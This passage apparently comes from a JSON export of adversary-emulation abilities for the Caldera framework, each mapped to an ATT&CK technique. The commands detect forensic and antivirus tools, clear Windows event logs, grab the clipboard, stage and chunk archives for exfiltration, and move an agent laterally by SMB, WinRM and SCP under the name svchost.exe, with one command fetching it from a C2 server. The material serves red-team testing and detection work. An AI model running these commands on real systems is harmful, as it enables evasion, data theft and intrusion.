                "command": "$forensicProcesses = @(\n    \"apimonitor-x64\",\n    \"apimonitor-x86\",\n    \"autopsy64\",\n    \"autopsy\",\n    \"autoruns64\",\n    \"autoruns\",\n    \"autorunsc64\",\n    \"autorunsc\",\n    \"binaryninja\",\n    \"blacklight\",\n    \"cff explorer\",\n    \"cutter\",\n    \"de4dot\",\n    \"debugview\",\n    \"diskmon\",\n    \"dnsd\",\n    \"dnspy\",\n    \"dotpeek32\",\n    \"dotpeek64\",\n    \"dumpcap\",\n    \"evidence center\",\n    \"exeinfope\",\n    \"fakedns\",\n    \"fakenet\",\n    \"ffdec\",\n    \"fiddler\",\n    \"fileinsight\",\n    \"floss\",\n    \"gdb\",\n    \"hiew32demo\",\n    \"hiew32\",\n    \"hollows_hunter\",\n    \"idaq64\",\n    \"idaq\",\n    \"idr\",\n    \"ildasm\",\n    \"ilspy\",\n    \"jd-gui\",\n    \"lordpe\",\n    \"officemalscanner\",\n    \"ollydbg\",\n    \"pdfstreamdumper\",\n    \"pe-bear\",\n    \"pebrowse64\",\n    \"peid\",\n    \"pe-sieve32\",\n    \"pe-sieve64\",\n    \"pestudio\",\n    \"peview\",\n    \"ppee\",\n    \"procdump64\",\n    \"procdump\",\n    \"processhacker\",\n    \"procexp64\",\n    \"procexp\",\n    \"procmon\",\n    \"prodiscoverbasic\",\n    \"py2exedecompiler\",\n    \"r2agent\",\n    \"rabin2\",\n    \"radare2\",\n    \"ramcapture64\",\n    \"ramcapture\",\n    \"reflector\",\n    \"regmon\",\n    \"resourcehacker\",\n    \"retdec-ar-extractor\",\n    \"retdec-bin2llvmir\",\n    \"retdec-bin2pat\",\n    \"retdec-config\",\n    \"retdec-fileinfo\",\n    \"retdec-getsig\",\n    \"retdec-idr2pat\",\n    \"retdec-llvmir2hll\",\n    \"retdec-macho-extractor\",\n    \"retdec-pat2yara\",\n    \"retdec-stacofin\",\n    \"retdec-unpacker\",\n    \"retdec-yarac\",\n    \"rundotnetdll\",\n    \"sbiesvc\",\n    \"scdbg\",\n    \"scylla_x64\",\n    \"scylla_x86\",\n    \"shellcode_launcher\",\n    \"solarwindsdiagnostics\",\n    \"sysmon64\",\n    \"sysmon\",\n    \"task explorer\",\n    \"task explorer-x64\",\n    \"tcpdump\",\n    \"tcpvcon\",\n    \"tcpview\",\n    \"vboxservice\",\n    \"win32_remote\",\n    \"win64_remotex64\",\n    \"windbg\",\n    \"windump\",\n    \"winhex64\",\n    \"winhex\",\n    \"winobj\",\n    \"wireshark\",\n    \"x32dbg\",\n    \"x64dbg\",\n    \"xwforensics64\",\n    \"xwforensics\",\n    \"redcloak\",\n    \"avgsvc\",\n    \"avgui\",\n    \"avgsvca\",\n    \"avgidsagent\",\n    \"avgsvcx\",\n    \"avgwdsvcx\",\n    \"avgadminclientservice\",\n    \"afwserv\",\n    \"avastui\",\n    \"avastsvc\",\n    \"aswidsagent\",\n    \"aswidsagenta\",\n    \"aswengsrv\",\n    \"avastavwrapper\",\n    \"bccavsvc\",\n    \"psanhost\",\n    \"psuaservice\",\n    \"psuamain\",\n    \"avp\",\n    \"avpui\",\n    \"ksde\",\n    \"ksdeui\",\n    \"tanium\",\n    \"taniumclient\",\n    \"taniumdetectengine\",\n    \"taniumendpointindex\",\n    \"taniumtracecli\",\n    \"taniumtracewebsocketclient64\"\n);\n\nfunction Find-ForensicProcesses {\n    param (\n        $ForensicProcessList\n    );\n    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;\n    foreach ($proc in $CurrentProcesses) {\n        foreach ($forensicProc in $ForensicProcessList) {\n            if ($proc.name -like $forensicProc) {\n                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;\n                Write-Host \"[!] Forensic process found: \" $proc.Name;\n                Write-Host \"[!] Path: \" $procPath.Path;\n            }\n        }\n    }\n}\n\nFind-ForensicProcesses($forensicProcesses);",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Check for analysis/sandbox environment processes. Process black list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Check analysis environment processes",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "fcf71ee3-d1a9-4136-b919-9e5f6da43608",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "Elevated",
        "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
        "technique_id": "T1070.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Clear-Eventlog Security;\nClear-Eventlog System;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Clear-Eventlog Security;\nClear-Eventlog System;",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Clear Logs",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "technique_id": "T1018",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "arp -a",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ipaddr",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "arp -a",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ipaddr",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "arp -a",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ipaddr",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "arp -a",
                "name": "cmd",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.ipaddr",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Locate all active IP and FQDNs on the network",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Collect ARP details",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "cf2b950c-3b6e-48b5-aa32-0d0973d1fa12",
        "buckets": [],
        "privilege": "",
        "technique_name": "Create and Execute Bash Shell Script",
        "technique_id": "T1059.004",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/art.sh;"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh;\necho 'ping -c 4 8.8.8.8' >> /tmp/art.sh;\nchmod +x /tmp/art.sh;\nsh /tmp/art.sh;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/art.sh;"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh;\necho 'ping -c 4 8.8.8.8' >> /tmp/art.sh;\nchmod +x /tmp/art.sh;\nsh /tmp/art.sh;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {
            "cleanup": "[]"
        },
        "access": {},
        "description": "Creates and executes a simple bash script",
        "plugin": "",
        "singleton": true,
        "delete_payload": true,
        "name": "Command and Scripting Interpreter: Bash",
        "tactic": "execution",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2f90d4de-2612-4468-9251-b220e3727452",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "technique_id": "T1560.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{host.dir.git}.tar.gz;"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tar -czf #{host.dir.git}.tar.gz -C \"#{host.dir.git}\" .; printf #{host.dir.git}.tar.gz;",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "Remove-Item -Path #{host.dir.git}.tar.gz;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tar -czf #{host.dir.git}.tar.gz -C #{host.dir.git} *; Write-Host #{host.dir.git}.tar.gz; exit 0;",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This ability will compress a given git repository.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Compress Git Repository",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "5c5b0392-1daa-45e1-967c-2f361ce78849",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Data Transfer Size Limits",
        "technique_id": "T1030",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "find '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' -exec rm -rf {} \\;"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase '#{host.archive.password}' > #{host.dir.staged}.tar.gz.gpg;\nsplit -b#{file.size.chunk} '#{host.dir.staged}.tar.gz.gpg' '#{host.dir.staged}'/calderachunk;\nrm '#{host.dir.staged}.tar.gz.gpg';\nfind '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' 2>/dev/null;",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "Get-ChildItem -Path \"$StageDir\\calderachunk*\" | Remove-Item;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" '-p#{host.archive.password}' | Out-Null;\nsleep 2;\n$Archive = Get-Item -Path \"#{host.dir.staged}.7z\";\n$StageDir = \"#{host.dir.staged}\";\n$BaseName = $StageDir + \"\\calderachunk\";\n$UpperBound = [int32]\"#{file.size.chunk}\";\n$Content = [IO.File]::OpenRead($Archive);\n$buff = New-Object byte[] $UpperBound;\n$Bytes = $idx = 0;\ntry {\n    do {\n        $Bytes = $Content.Read($buff, 0, $buff.Length);\n        if ($Bytes -gt 0) {\n            $ChunkName = \"{0}{1}\" -f ($BaseName, $idx.ToString().PadLeft(3,'0'));\n            $ChunkFile = [IO.File]::OpenWrite($ChunkName);\n            try {\n                $ChunkFile.Write($buff, 0, $Bytes);\n            } finally {\n                $ChunkFile.Close();\n            }\n        }\n        $idx ++;\n    } while ($Bytes -gt 0)\n}\nfinally {\n    $Content.Close();\n}\nRemove-Item $Archive;\nGet-ChildItem -Path \"$StageDir\\calderachunk*\" | foreach {$_.FullName} | Select-Object;",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This ability will compress the staged files into a password protected archive and break it\ninto smaller chunks based on the given byte size. The original archive will be automatically\ndeleted. Use this instead of other archiving abilities if small file sizes for exfiltration \nare desired. When used with an exfiltration ability, the exfiltration ability will run numerous\ntimes in an operation depending on how many chunks are created. \n",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Compress Staged Directory (Password Protected) and Split Into Smaller Chunks",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "technique_id": "T1560.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{host.dir.staged}.tar.gz"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{host.dir.staged}.tar.gz"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{host.dir.staged}.zip"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{host.dir.staged}.zip"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;\nsleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select",
                "name": "pwsh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Compress a directory on the file system",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Compress staged directory",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "technique_id": "T1560.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{host.dir.staged}.tar.gz.gpg"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "rm #{host.dir.staged}.7z"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.dir.compress",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Compress staged directory (Password Protected)",
        "tactic": "collection",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.dir.staged"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30",
        "buckets": [
            "lateral-movement"
        ],
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "technique_id": "T1021.002",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nRemove-Item -Path $drive\"\\Users\\Public\\s4ndc4t.exe\" -Force;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$path = \"sandcat.go-windows\";\n$drive = \"\\\\#{remote.host.fqdn}\\C$\";\nCopy-Item -v -Path $path -Destination $drive\"\\Users\\Public\\s4ndc4t.exe\";",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.54ndc47_remote_copy",
                        "parserconfigs": [
                            {
                                "edge": "has_54ndc47_copy",
                                "target": "",
                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "sandcat.go-windows"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Copy 54ndc47 to remote host (SMB)",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Copy 54ndc47 (SMB)",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.not_exists",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_54ndc47_copy"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.basic",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_share"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.no_backwards_movement",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ]
            },
            {
                "module": "plugins.stockpile.app.requirements.reachable",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
        "buckets": [
            "lateral-movement"
        ],
        "privilege": "",
        "technique_name": "Lateral Tool Transfer",
        "technique_id": "T1570",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "sandcat.go-windows"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;",
                "name": "pwsh",
                "parsers": [],
                "payloads": [
                    "sandcat.go-windows"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "sandcat.go-darwin"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "sandcat.go-linux"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Copy 54ndc47 (WinRM and SCP)",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Clipboard Data",
        "technique_id": "T1115",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "pbpaste",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-Clipboard -raw",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Get-Clipboard -raw",
                "name": "pwsh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "xclip -o",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "copy the contents for the clipboard and print them",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Copy Clipboard",
        "tactic": "collection",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3734aa1e-c536-42b3-8912-4c91b8bdce90",
        "buckets": [
            "lateral-movement"
        ],
        "privilege": "",
        "technique_name": "Remote Services: Windows Remote Management",
        "technique_id": "T1021.006",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "del sandcat.go-windows; Invoke-Command -ComputerName"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$server=\"#{server}\";\n$sharePath=\"#{share}\";\nSet-Location $sharePath;$url=\"$($server)/file/download\";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"))\n-and ([io.file]::WriteAllBytes(\"$($sharePath)$name.exe\",$data));\n$startServer=\"$($sharePath)$name.exe -server $($server) \";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList \"$($sharePath)$name.exe\n-server $server -v\" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "sandcat.go-windows"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Copy Sandcat file using PowerShell",
        "plugin": "stockpile",
        "singleton": true,
        "delete_payload": true,
        "name": "Copy Sandcat File using Powershell",
        "tactic": "lateral-movement",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "620b674a-7655-436c-b645-bc3e8ea51abd",
        "buckets": [
            "lateral-movement"
        ],
